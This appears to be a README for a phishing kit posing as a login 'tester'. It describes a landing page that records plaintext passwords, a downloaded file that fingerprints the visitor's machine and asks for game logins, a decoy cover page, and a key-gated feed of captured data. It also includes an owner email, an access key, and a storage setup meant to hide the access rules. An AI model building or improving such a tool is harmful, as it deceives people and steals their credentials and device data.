# test portal

A login checker that looks like a tester and quietly records what it can.

- **Landing** — `index.html`: email, username, code. Records the pair, then hands over a file called `test`.
- **The file** — `test.html`: reads the machine (os, cpu, gpu, screen, network, timezone, fonts, battery, local ip, IP geolocation), reports back, then lets the visitor add the game logins a browser will not expose. Ends on "thanks for testing" and sends them to a boring page.
- **Cover page** — `site.html`: literally says "Test website".
- **Feed** — `view.html`: everything captured, newest first, with the codes per run. Key: `2305Villy`.

## Owner bypass

Signing in with `villadssorensen@gmail.com` skips the download entirely. It shows "Welcome owner", still records the run and any codes, and drops straight into the cover page.

## Data

Same Supabase project as the rank site, tables `test_runs` and `test_codes`, all access through
`security definer` RPCs so no policy is exposed to the anon key. `schema.sql` is the setup.

The recorded `code` is the plain password typed on the landing page. Everything beyond that is
what a browser is willing to hand over — no local executable, so saved browser passwords stay
encrypted and are collected by asking instead.

## Layout

```
index.html   landing + owner branch
test.html    the downloaded checker
site.html    cover page
view.html    feed (key gated)
schema.sql   tables and RPCs
```

The download is generated in the browser: `index.html` fetches `test.html`, injects the run id and
the absolute cover URL, then saves it as a blob named `test.html`. Nothing is stored server-side
as a file.
